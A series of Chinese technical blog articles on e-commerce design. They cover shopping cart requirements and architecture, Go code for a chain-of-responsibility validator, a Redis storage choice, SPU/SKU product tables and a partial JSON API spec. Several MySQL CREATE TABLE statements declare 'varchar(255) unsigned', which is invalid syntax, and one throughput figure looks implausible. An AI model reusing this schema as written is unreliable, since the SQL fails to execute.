服务端要解决的是促销的提醒与价格计算问题。 现来说计算，针对这部分最佳的方式是，调用结算中心的价格计算。我们来看一下购物车中的价格计算与订单结算时的价格计算的差异。 首先购物车中计算价格时不知道用户的地址，这会影响运费的计算；再是不知道用券的情况。那么其实如果解决了这两个问题，我们就可以让价格计算出自同一个逻辑，仅仅是部分入参不同罢了。因此我们这里计算时可以按照最高运费来计算，同时用券默认在购物车都不使用券。对于促销问题这里是可以通过促销系统确认选中的商品可以享受哪些价格的。因此促销的价格应该计算在内。 接下来在再来说说如何为用户高效的提供促销的信息。先从我们的配置视野出发。 我们在配置一个促销活动或者发一张券时，都是将多个商品归到一个促销活动或者券的下面。如果按照活动、券的纬度来获取商品效率相对比较高。 但是在购物车的场景中发生了一个变化。我们是需要从商品纬度获取到该商品的所有活动信息（全平台活动、店铺活动）；那么购物车中为了展示这些信息该怎么做？很常规的一个做法（也确实不少公司是这样）：把所有活动信息取出来，遍历出所有跟该商品相关的信息。这种做法效率很低，并且无法满足大规模的应用场景，比如双十一期间。 因此这里为了满足该需求，促销系统需要提供一个能力按照商品获取对应促销（活动、券）。因此一般来讲促销系统配置的活动不能仅仅是按照活动纬度存储，同时还需要生成一份商品纬度的促销信息。 购物车数据分析对于购物车数据来说，前端会通过埋点记录加入购物车数据的情况，但是前端埋点一般是记录触发了某个前端操作，但是并不知道该操作是否成功与否。以及无法及时了解当前整体购物车的数据情况。 为了让运营团队更完整的了解购物车当前情况，我们通过后端打本地日志，然后通过日志收集的方式将日志同步给数据、监控等服务。 失效与排序还有两个小部分没有讲到，一是商品该如何失效，比如：库存没有了、下架了；二是购物车中的商品是多个店铺的，排序的策略是什么？ 由于本文我们还只是讨论需求，不涉及具体的模型设计，因此只是介绍方案。首先是商品失效，这很像一个软删除操作，一旦设置，用户侧看到的商品将是无法进行结算的，只能进行删除操作。 对于排序我们会采用的设计是：根据某个店铺在购物车中最后发生操作的时间，最新的操作肯定在最上面。 结尾通过上面我们基本上搞清楚了购物车设计中我们要做什么，依赖的系统要提供什么能力。下篇开始进入数据模型的设计、前后端接口设计。 如果你对购物车上面的需求还有哪些补充，欢迎留言。我们一起来完善。 购物车架构在上一篇文章 购物车设计之需求分析 描述了购物车的通用需求。本文重点则在如何实现上进行架构上的设计（业务+系统架构）。 说明架构设计可以分为三个层面： 业务架构 系统架构 技术架构 快速简单的说明下三个架构的意思；当我们拿到购物车需求时，我们说用Golang来实现，存储用Redis；这描述的是技术架构；我们对购物车代码项目进行代码分层，设计规范，以及依赖系统的规划这叫系统架构； 那业务架构是什么呢？业务架构本质上是对系统架构的文字语言描述；什么意思？我们拿到一个需求首先要跟需求方进行沟通，建立统一的认知。比如：规范名词（购物车中说的商品与商品系统中商品的含义是不同的）；建立大家都能明白的模型，购物车、用户、商品、订单这些实体之间的互动，以及各自具备什么功能。 在业务架构分析上有很多方法论，比如：领域驱动设计，但是它并不是唯一的业务架构分析方法，也并不是说最好的。适合你的就是最好的。我们常用的实体关系图、UML图也属于业务架构领域； 这里需要强点一点的是，不管你用什么方式来建模设计，有设计总比没设计强，其次一定要将建模的内容体现到你的代码中去。 本文在业务架构上的分析借助了 DDD （领域驱动设计）思想；还是那句话适合的就是最好的。 业务架构通过前面的需求分析，我们已经明确我们的购物车要干什么了。先来看一下一个典型的用户操作购物车过程。 在这个过程中，用户使用购物车这个载体完成了商品的购买流程；不断流动的数据是商品，购物车这个载体是稳定的。这是我们系统中的稳定点与变化点。 商品的流动方式可能多种多样，比如从不同地方加入购物车，不同方式加入购物车，生命周期在购物车中也不一样；但是这个流程是稳定的，一定是先让购物车中存在商品，然后才能去结算产生订单。 商品在购物车中的生命周期如下： 按照这个过程，我们来看一下每个阶段对应的操作。 这里注意一点，加车前这个操作其实我们可以放到购物车的添加操作中，但是由于这部分是非常不稳定且多变的。我们将其独立出来，方便后续进行扩展而不影响相对比较稳定的购物车阶段。 上面这三个阶段，按照DDD中的概念，应该叫做实体，他们整体构成了购物车这个域；今天我们先不讲这些概念，就先略过，后面有机会单独发文讲解。 加车前通过流程分析，我们总结出了系统需要具备的操作接口，以及这些接口对应的实体，现在我们先来看加车前主要要做些什么； 加车前其实主要就是对准备加入的购物车商品进行各个纬度的校验，检查是否满足要求。 在让用户加车前，我们首先解决的是用户从哪里卖，然后进行验证？因为同一个商品从不同渠道购买是存在不同情况的，比如：小米手机，我们是通过秒杀买，还是通过好友众筹买，或者商城直接购买，价格存在差异，但是实际上他是同一个商品； 第二个问题是是否具备购买资格，还是上面说的，秒杀、众筹这个加车操作，不是谁都可以添加的，得现有资格。那么资格的检查也是放到这里； 第三个问题是对这个购买的商品进行商品属性上的验证，如是否上下架，有库存，限购数量等等。 而且大家会发现，这里的验证条件可能是非常多变的。如何构建一个方便扩展的代码呢？ 整个加车过程，重要的就是根据来源来区分不同的验证。我们有两种选择方式。 方式一：通过策略模式+门面模式的方式来搞定。策略就是根据不同的加车来源进行不同的验证，门面就是根据不同的来源封装一个个策略； 方式二：通过责任链模式，但是这里需要有一个变化，这个链在执行过程中，可以选择跳过某些节点，比如：秒杀不需要库存、也不需要众筹的验证； 通过综合的分析我选择了责任链的模式。贴一下核心代码 1234567891011121314151617// 每个验证逻辑要实现的接口type Handler interface &#123; Skipped(in interface&#123;&#125;) bool // 这里判断是否跳过 HandleRequest(in interface&#123;&#125;) error // 这里进行各种验证&#125;// 责任链的节点type RequestChain struct &#123; Handler Next *RequestChain&#125;// 设置handlerfunc (h *RequestChain) SetNextHandler(in *RequestChain) *RequestChain &#123; h.Next = in return in&#125; 关于设计模式，大家可以看我小伙伴的github：https://github.com/TIGERB/easy-tips/tree/master/go/src/patterns 购物车说完了加车前，现在来看购物车这一部分。我们在之前曾讨论过，购物车可能会有多种形态的，比如：存储多个商品一起结算，某个商品立即结算等。因此购物车一定会根据渠道来进行购物车类型的选择。 这部分的操作相对是比较稳定的。我们挑几个比较重要的操作来讲一下思路即可。 加入购物车 通过把条件验证的前置，会发现在进行加车操作时，这部分逻辑已经变得非常的轻量了。要做的主要是下面几个部分的逻辑。 这里有几个取巧的地方，首先是获取商品的逻辑，由于在前面验证的时候也会用到，因此这里前面获取后会通过参数的方式继续往后传递，因此这里不需要在读库或者调用服务来获取； 其次这里需要把当前用户现有购物车数据获取到，然后将添加的这个商品添加进来。这是一个类似合并操作，原来这个商品是存在，相当于数量加一；需要注意这个商品跟现存的商品有没有父子关系，有没有可能加入后改变了某个活动规则，比如：原来买了2个送1个赠品，现在再添加了一个变成3个，送2个赠品； 注意：这里的添加并不是在购物车直接改数量，可能就是在列表、详情页直接添加添加。 通过将合并后的购物车数据，通过营销活动检查确认ok后，直接回写到存储中。 合并购物车 为什么会有合并购物车这个操作？因为一般电商都是准许游客身份进行操作的，因此当用户登录后需要将二者进行合并。 这里的合并很多部分的逻辑是可以与加入购物车复用的逻辑。比如：合并后的数据都需要检查是否合法，然后覆写回存储中。因此大家可以看到这里的关联性。设计的方法在某种程度上要通用。 购物车列表 购物车列表这是一个非常重要的接口，原则上购物车接口会提供两种类型，一种简版，一种完全版本； 简版的列表接口主要是用在类似PC首页右上角之类获取简单信息；完全版本就是在购物车列表中会用到。 在实际实现中，购物车绝不仅仅是一个读取接口那么简单。因为我们都知道不管是商品信息、活动信息都是在不断的发生变化。因此每次的读取接口必然需要检查当前购物车中数据的合法性，然后发现不一致后需要覆写原存储的数据。 也有一些做法会在每个接口都去检查数据的合法性，我建议为了性能考虑，部分接口可以适当放宽检查，在获取列表时再进行完整的检查。比如添加接口，我只会检测我添加的商品的合法性，绝不会对整个购物车进行检查。因为该操作之后一般都会调用列表操作，那么此时还会进行校验，二者重复操作，因此只取后者。 结算结算包括两部分，结算页的详情信息与提交订单。结算页可以说是在购物车列表上的一个包装，因为结算页与列表页最大的不同是需要用户选择配送地址（虚拟商品另说），此时会产生更明确的价格信息，其他基本一致。因此在设计购物车列表接口的时候，一定要考虑充分的通用性。 这里另外一个需要注意的是：立即购买，我们也会通过结算页接口来实现，但是内部其实还是会调用添加接口，将商品添加到购物车中；有三个需要注意的地方，首先是这个添加操作是服务内部完成的，对于服务调用方是不需要感知这个加入操作的存在；其次是这个购物车在Redis中的Key是独立于普通购物车的，否则二者的商品耦合在一起非常难于操作处理；最后立即购买的购物车要考虑账号多终端登录的时候，彼此数据不能互相影响，这里可以用每个端的uuid来作为购物车的标记避免这种情况。 购物车的最后一步是生成订单，这一步最要紧的是需要给购物车加锁，避免提交过程中数据被篡改，多说一句，很多人写的Redis分布式锁代码都存在缺陷，大家一定要注意原子性的问题，这类文章网络上很多不再赘述。 加锁成功之后，我们这里有多种做法，一种是按照DB涉及组织数据开始写表，这适用于业务量要求不大，比如订单每秒下单量不超过2000K的；那如果你的系统并发要求非常高怎么办？ 其实也很简单，高性能的三大法宝之一：异步；我们提交的时候直接将数据快照写入MQ中，然后通过异步的方式进行消费处理，可以通过通过控制消费者的数量来提升处理能力。这种方法虽然性能提升，但是复杂度也会上升，大家需要根据自己的实际情况来选择。 关于业务架构的设计，到此告一段落，接下来我们来看系统架构。 系统架构系统结构主要包含，如何将业务架构映射过来，以及输出对应输入参数、输出参数的说明。由于输入、输出针对各自业务来确定的，而且没有什么难度，我们这里就只说如何将业务架构映射到系统架构，以及系统架构中最核心的Redis数据结构选择以及存储的数据结构设计。 代码结构下面的代码目录是按照 Golang 来进行设计的。我们来看看如何将上面的业务架构映射到代码层面来。 12345678910111213141516171819├── addproducts.go├── cartlist.go├── mergecart.go├── entity│ ├── cart│ │ ├── add.go│ │ ├── cart.go│ │ └── list.go│ ├── order│ │ ├── checkout.go│ │ ├── order.go│ │ └── submit.go│ └── precart├── event│ └── sendorder.go├── facade│ ├── activity.go│ └── product.go└── repo 外层有 entity、event、facade、repo这四个目录，职责如下： entity: 存放的是我们前面分析的购物领域的三个实体；所有主要的操作都在这三个实体上； event: 这是用来处理产生的事件，比如刚刚说的如果我们提交订单采用异步的方式，那么该目录就该完成的是如何把数据发送到MQ中去； facade: 这儿目录是干嘛的呢？这主要是因为我们的服务还需要依赖像商品、营销活动这些服务，那么我们不应该在实体中直接调用它，因为第三方可能存在变动，或者有增加、减少，我们在这里进行以下简单的封装(设计模式中的门面模式)； repo: 这个目录从某种程度上可以理解为 Model层，在整个领域服务中，如果与持久化打交道，都通过它来完成。 最后外层的几个文件，就是我们所提供的领域服务，供应用层来进行调用的。 为了保证内容的紧凑，我这里放弃了对整个微服务的目录介绍，只单独介绍了领域服务，后续会单独成文介绍下微服务的整个系统架构。 通过上面的划分，我们完成了两件事情： 业务架构分析的结构在系统代码中都有映射，他们彼此体现。这样最大的好处是，保证设计与代码的一致性，看了文档你就知道对应的代码在哪里； 每个目录各自的关注点都进行了分离，更内聚，更容易开发与维护。 Redis存储现在来看，我们选择Redis作为购物商品数据的存储，我们要解决两个问题，一是我们需要存哪些数据？二是我们用什么结构来存？ 网络上很多写购物车的都是只保存一个商品id，真实场景是很难满足需求的。你想想，一个商品id如何记住用户选择的赠品？用户上次选择的活动？以及购买的商品渠道？ 综合比较通用的场景，我给出一个参考结构： 1234567891011121314151617181920212223242526272829303132// 购物车数据type ShoppingData struct &#123; Item []*Item `json:"item"` UpdateTime int64 `json:"update_time"` Version int32 `json:"version"`&#125;// 单个商品item元素type Item struct &#123; ItemId string `json:"item_id"` ParentItemId string `json:"parent_item_id,omitempty"` // 绑定的父item id OrderId string `json:"order_id,omitempty"` // 绑定的订单号 Sku int64 `json:"sku"` Spu int64 `json:"spu"` Channel string `json:"channel"` Num int32 `json:"num"` Status int32 `json:"status"` TTL int32 `json:"ttl"` // 有效时间 SalePrice float64 `json:"sale_price"` // 记录加车时候的销售价格 SpecialPrice float64 `json:"special_price,omitempty"` // 指定价格加购物车 PostFree bool `json:"post_free,omitempty"` // 是否免邮 Activities []*ItemActivity `json:"activities,omitempty"` // 参加的活动记录 AddTime int64 `json:"add_time"` UpdateTime int64 `json:"update_time"`&#125;// 活动type ItemActivity struct &#123; ActID string `json:"act_id"` ActType string `json:"act_type"` ActTitle string `json:"act_title"`&#125; 重点说一下 Item 这个结构，item_id 这个字段是标记购物车中某个商品的唯一标记，因为我们之前说过，同一个sku由于渠道不同，那么在购物车中会是两个不同的item；接下来的 parent_item_id 字段是用来标记父子关系的，这里将可能存在的树结构转成了顺序结构，我们不管是父商品还是子商品，都采用顺序存储，然后通过这个字段来进行关联；有些同学可能会奇怪，为什么会存order id这个字段呢？大家关注下自己的日常业务，比如：再来一单、定金预售等，这种一定是与某个订单相关联的，不管是为了资格验证还是数据统计。剩下的字段都是一些非常常规的字段，就不在一一介绍了； 字段的类型，大家根据自己的需要进行修改。 接下来该说怎么选择Redis的存储结构了，Redis常用的 Hash Table、集合、有序集合、链表、字符串 五种，我们一个个来分析。 首先购车一定有一个key来标记这个购物车属于哪个用户的，为了简化，我们的key假设是：uid:cart_type。 我们先来看如果用 Hash Table；我们添加时，需要用到如下命令：HSET uid:cart_type sku ShoppingData；看起来没问题，我们可以根据sku快速定位某个商品然后进行相关的修改等，但是注意，ShoppingData是一个json串，如果用户购物车中有非常多的商品，我们用 HGETALL uid:cart_type 获取到的时间复杂度是O(n)，然后代码中还需要一一反序列化，又是O(n)的复杂度。 如果用集合，也会遇到类似的问题，每个购物车看做一个集合，集合中的每个元素是 ShoppingData ，取到代码中依然需要逐一反序列化(反序列化是成本)，关于有序集合与链表就不在分析，大家可以按照上面的思路去尝试下问题所在。 看起来我们没得选，只有使用String，那我们来看一下String的契合度是什么样子。首先SET uid:cart_type ShoppingDataArr；我们把购物车所有的数据序列化成一个字符串存储，每次取出来的时间复杂度是O(1)，序列化、反序列化都只需要一次。看来是非常不错的选择。但是在使用中大家还是有几点需要注意。 单个Value不能太大，要不然就会出现大key问题，所以一般购物车有上限限制，比如item不能超过多少个； 对redis的操作性能提升上来了，但是代码的就是修改单个item时的不便，必须每次读取全部然后找到对应的item进行修改；这里我们可以把从redis中的数据读取出来后，在内存中构建一个HashTable，来减少每次遍历的复杂度； 网上也看到很多Redis数据结构组合使用来保存购物车数据的，但是无疑增加了网络开销，相比起来还是String最经济划算。 总结至此对于购物车的实现设计算是完结了，其中关于订单表的设计会单独放到订单模块去讲。 对于整个购物车服务，虽然没有写的详细到某个具体的接口，但是分析到这一步，我相信大家心中都是有沟壑的，能够结合自己的业务去实现它。 文中有些很有意思的地方，建议大家动手去做做看，有任何问题，我们随时交流。 改编版的责任链模式 Redis的分布式事务锁实现 接下来终于要到订单部分的设计了，希望大家继续关注我们。 商品系统商品系统(Temporal万物)今天我们开始「商品系统」的篇章。本文分为如下五大模块： 需求分析 架构设计 Spu和Sku的故事 数据模型设计 接口设计 第一篇我们主要看看一个入门的电商平台(B2C)如何去构建自己的基础商品信息，其实这个事情很简单，想想我们的现实生活，商家摆放商品到货架，客户从货架挑选商品，客户把挑选好的商品放入购物车(篮)，最后客户去收银台结账。 需求分析对于一个电商平台来讲，我们怎么理解上面的简单示例呢？接着，我们来拆分上面这个简单的事情： 商家摆放商品到货架，客户从货架挑选商品，客户把挑选好的商品放入购物车(篮)，最后客户去收银台结账 商家是谁：电商平台 摆放是什么意思：上架 货架在哪：前台系统(web/app/…) 挑选：浏览前台系统 放入：点击前台系统「加入购物车按钮」 …(暂不多说了) 备注：本篇文章主要来看看1、2、3、4步该如何去设计。 通过上面的分析我们可以得出下面的信息： 我们需要一个「电商平台」，电商平台里面需要有个商品后台系统。 我们上架什么东西呢？商品！所以商品后台系统需要具备创建和发布商品到前台系统的功能。 我们需要一个前台系统(比如网页)，前台系统具备商品列表和商品详情的页面，可供用户浏览。 前台系统的数据怎么来？所以我们需要一个接口网关(对外统一提供服务能力，企业总线)和商品服务 整理之后得到如下的需求点： 需求点 功能点 项目命名 技术栈 商品后台系统 1.创建商品 2.发布商品到前台系统 Temporal Backend PHP 前台系统 1.商品列表 2.商品详情 Skr Frontend Vue 接口网关 企业总线 Skr Gateway kong 商品服务 1.创建商品接口 2.商品状态变更接口 2.商品列表接口 3. 商品详情接口 Temporal Service Golang 架构设计通过上面的需求分析，再加上之前的《电商设计手册之用户体系》中的用户体系和《支付开发，不得不了解的国内、国际第三方支付流程》中的支付服务，我们规划出以下的架构图。 Spu和Sku的故事对我们程序猿来讲「商品系统」刚开始的样子就是如下三点： 创建商品功能：首先我们会有一张商品表，每创建一个商品我们会的到一个goods_id，如果商品存在父子的关系，加一个parent_id的字段就搞定了。 商品列表接口：商品表分页查询商品。 商品详情接口：商品表按goods_id索引查询商品信息。 很简单是吧，基本一张表就搞定了，看起来也是没什么问题的。但是呢，程序设计的巧妙之处就在于抽象能力，电商行业把goods_id进行了进一步的抽象，产生了Spu和Sku概念，在了解Spu和Sku定义之前，我们还得了解下销售属性的含义，举个例子便于理解： 想想我们的现实生活，假如我们去批发市场上了一批AJ1球鞋，批发商会给我们不同配色、大小的AJ1球鞋。我们在店里销售这些商品时都会询问客户：“您是需要什么颜色和大小的AJ1球鞋呢？”。这里的颜色和大小就是所谓的销售属性，因为不同颜色和大小的AJ1球鞋可能价格不同、库存数量不同，现实生活中是不是如此，不同颜色或大小的AJ1都有差别巨大的价格。 接着，我们来看看Spu和Sku定义： 名称 概念 解释 Spu standard product unit 标准产品单位 goods_id剥离销售属性的部分，例如：小米8。商品列表我们展示Spu列表。 Sku stock keeping unit 库存量单位 就是你想买的那个商品真正的编号，这个编号对应的库存就是你想买的那个商品的库存量。Spu+一或多个销售属性对应一个Sku，例如：小米8黑128G，其中黑和128G就是销售属性，小米8就是一个Spu。 搞清楚了么？ 数据模型设计所以最后简单的商品表就拆成了spu表和sku表，接着我们还抽象出来了可复用的销售属性表和销售属性值表。除此之外我们应该还有品牌表、类别表、简单的sku库存表(目前简单设计此表，后期具体业务重构此表)。接着我们列下这些表的明细： 表名称 表名 品牌表 product_brands 类别表 product_category spu表 product_spu sku表 product_sku 销售属性表 product_attr 销售属性值 product_attr_value sku库存表 product_sku_stock 除了上面的表之外，我又加了另一张表 关联关系冗余表 product_spu_sku_attr_map，为什么呢？顾名思义，冗余用的，有了这张表，我们可以很高效的得到： spu下 有哪些sku spu下 有那些销售属性 spu下 每个销售属性对应的销售属性值(一对多) spu下 每个销售属性值对应的sku(一对多) 具体表结构如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133-- 品牌表 product_brandsCREATE TABLE `product_brands` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '品牌ID', `name` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '品牌名称', `desc` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '品牌描述', `logo_url` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '品牌logo图片', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='品牌表';-- 类别表 product_categoryCREATE TABLE `product_category` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '分类ID', `pid` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '父ID', `name` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '分类名称', `desc` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '分类描述', `pic_url` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '分类图片', `path` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '分类地址&#123;pid&#125;-&#123;child_id&#125;-...', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='类别表';-- spu表 product_spu-- spu: standard product unit 标准产品单位CREATE TABLE `product_spu` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT 'SPU ID', `brand_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '品牌ID', `category_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '分类ID', `name` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT 'spu名称', `desc` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT 'spu描述', `selling_point` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '卖点', `unit` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT 'spu单位', `banner_url` text COMMENT 'banner图片 多个图片逗号分隔', `main_url` text COMMENT '商品介绍主图 多个图片逗号分隔', `price_fee` int unsigned NOT NULL DEFAULT 0 COMMENT '售价，整数方式保存', `price_scale` tinyint unsigned NOT NULL DEFAULT 0 COMMENT '售价，金额对应的小数位数', `market_price_fee` int unsigned NOT NULL DEFAULT 0 COMMENT '市场价，整数方式保存', `market_price_scale` tinyint unsigned NOT NULL DEFAULT 0 COMMENT '市场价，金额对应的小数位数', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT AUTO_INCREMENT=666666 CHARSET=utf8mb4 COMMENT='spu表';-- sku表 product_sku-- sku: stock keeping unit 库存量单位CREATE TABLE `product_sku` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT 'SKU ID', `spu_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT 'SPU ID', `attrs` text COMMENT '销售属性值&#123;attr_value_id&#125;-&#123;attr_value_id&#125; 多个销售属性值逗号分隔', `banner_url` text COMMENT 'banner图片 多个图片逗号分隔', `main_url` text COMMENT '商品介绍主图 多个图片逗号分隔', `price_fee` int unsigned NOT NULL DEFAULT 0 COMMENT '售价，整数方式保存', `price_scale` tinyint unsigned NOT NULL DEFAULT 0 COMMENT '售价，金额对应的小数位数', `market_price_fee` int unsigned NOT NULL DEFAULT 0 COMMENT '市场价，整数方式保存', `market_price_scale` tinyint unsigned NOT NULL DEFAULT 0 COMMENT '市场价，金额对应的小数位数', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT AUTO_INCREMENT=666666 CHARSET=utf8mb4 COMMENT='sku表';-- 销售属性表 product_attrCREATE TABLE `product_attr` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '销售属性ID', `name` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '销售属性名称', `desc` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '销售属性描述', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='销售属性表';-- 销售属性值 product_attr_valueCREATE TABLE `product_attr_value` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '销售属性值ID', `attr_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '销售属性ID', `value` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '销售属性值', `desc` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '销售属性值描述', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='销售属性值';-- 关联关系冗余表 product_spu_sku_attr_map-- 1. spu下 有哪些sku-- 2. spu下 有那些销售属性-- 3. spu下 每个销售属性对应的销售属性值(一对多)-- 4. spu下 每个销售属性值对应的sku(一对多)CREATE TABLE `product_spu_sku_attr_map` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增ID', `spu_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT 'SPU ID', `sku_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT 'SKU ID', `attr_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '销售属性ID', `attr_name` varchar(255) NOT NULL DEFAULT '0' COMMENT '销售属性名称', `attr_value_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '销售属性值ID', `attr_value_name` varchar(255) NOT NULL DEFAULT '0' COMMENT '销售属性值', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='关联关系冗余表';-- sku库存表 product_sku_stockCREATE TABLE `product_sku_stock` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增ID', `sku_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT 'SKU ID', `quantity` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '库存', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='sku库存表'; 接口设计关于接口设计目前很简单，无非列表和详情。但是这里我做了一个很好的设计动静分离，例如库存的动态的数据，单独提供接口，其他列表和详情数据完全静态化，把流量打到CDN去，这里又会说到我们下步计划的基础服务体系里的「静态资源服务」，这个服务的主要功能就是把我们的接口数据静态化。具体的V1.0版的接口设计如下： 1、spu详情 GET {version}/product/spu/{spu_id} 请求参数： 字段 类型 是否必传 描述 spu_id number yes spu ID 响应内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&#123; "code": "200", "msg": "OK", "result": &#123; "brand_info": &#123; "id": "number, 品牌ID", "name": "string, 品牌名称", "desc": "string, 品牌描述", "logo_url": "string, 品牌logo图片", &#125;, "category_info": &#123; "id": "number, 分类ID", "name": "string, 品牌名称", "desc": "string, 品牌描述", "pic_url": "string, 分类图片", "path": "string, 分类地址&#123;pid&#125;-&#123;child_id&#125;-...", &#125;, "spu_info": &#123; "id": "number, spu id", "name": "string, spu名称", "desc": "string, spu描述", "selling_point": "string, 卖点", "unit": "string, spu单位", "banner_url": [ "string, banner 图片url", "string, banner 图片url", ], "main_url": [ "string, 商品介绍主图 图片url", "string, 商品介绍主图 图片url", ], "price": "string, 售价", "market_price": "string, 市场价", "attrs": [ // 有那些销售属性 &#123; "id": "销售属性ID", "name": "string, 销售属性名称", "desc": "string, 销售属性描述", "values": [ // 每个销售属性对应的销售属性值(一对多) &#123; "id": "销售属性值ID", "name": "string, 销售属性值", "desc": "string, 销售属性值描述", // 每个销售属性值对应的sku(一对多) // 页面初始化时，按钮不可点击逻辑判断： 如果该销售属性值下所有sku没有库存，则该销售属性按钮不可点击 // 选择销售属性值时，按钮不可点击逻辑判断：销售属性构成双向链表，每个销售属性又是一个单向链表存改销售属性对应的所有销售属性值。每当选择一个销售属性值时先前和后一个销售属性遍历，执销售属性值下所有sku售罄的按钮不可点击，且当前销售属性值map记录key为当前点击的销售属性值ID，值统一标示一下就行，目的记录是由于选择了哪个销售属性值使得当前的销售属性值为售罄状态 // 取消选择销售属性值时，按钮不可点击逻辑恢复判断：数据结构同上，遍历，记录的map删除key为当前取消选中的销售属性值，并判断是否还有别的key使得该销售属性值为售罄状态，如果没有则恢复未售罄状态 "skus": [ "number, sku id", "number, sku id", ], &#125; 